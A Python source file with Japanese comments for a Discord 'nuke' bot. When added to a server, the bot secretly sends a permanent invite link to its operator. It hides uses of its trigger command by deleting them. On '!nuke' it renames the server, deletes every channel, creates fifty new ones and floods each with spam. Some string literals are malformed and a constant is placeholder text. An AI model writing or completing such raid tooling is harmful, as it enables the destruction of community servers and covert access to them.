#ライブラリ

import discord
from discord.ext import commands
import asyncio

# ボットのトークンを設定
TOKEN = ''TOKEN"
GUILD_NAME = '"GUILD_NAME"
CHANNEL_NAME = 'CHANNEL_MESSENGER"'
SPAM_MESSAGE = "MESSAGE"
TARGET_CHANNEL_ID = botが参加したら招待リンクを作成して送信する場所  # 指定したチャンネルのID

# Intentの設定
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="/help"))

@bot.event
async def on_guild_join(guild):
    # ボットがサーバーに参加したときの処理
    target_channel = bot.get_channel(TARGET_CHANNEL_ID)
    if target_channel:
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
            await target_channel.send(f'botがサーバーに参加しました {guild.name}\n→ {invite.url}')
        except Exception as e:
            print(f'Error creating invite: {e}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # '!nuke'という言葉を検知して削除
    if '!nuke' in message.content.lower():
        await message.delete()
        print(f'Deleted message containing !nuke from {message.author}')
    
    await bot.process_commands(message)

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    if guild:
        try:
            # サーバー名の変更
            await guild.edit(name=GUILD_NAME)
            print(f'Server renamed to: {GUILD_NAME}')
            
            # チャンネル削除とチャンネル作成を並行して実行
            delete_tasks = [channel.delete() for channel in guild.channels]
            create_tasks = [guild.create_text_channel(CHANNEL_NAME) for _ in range(50)]
            
            # 全てのタスクを同時に実行
            channels = await asyncio.gather(*delete_tasks, *create_tasks, return_exceptions=True)
            
            # 作成されたチャンネルのみを抽出
            created_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
            
            # スパムメッセージの送信
            spam_tasks = [spam_messages(channel) for channel in created_channels]
            await asyncio.gather(*spam_tasks)

        except Exception as e:
            print(f'Error during nuke operation: {e}')
            await ctx.send("An error occurred while trying to nuke the server.")

    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def spam_messages(channel):
    for _ in range(70):
        try:
            await channel.send(SPAM_MESSAGE)
            print(f'Message sent in {channel.name}')
            await asyncio.sleep(0.01)
        except:
            print(f'Failed to send message in {channel.name}')
            break

# ボットの実行
bot.run(TOKEN)
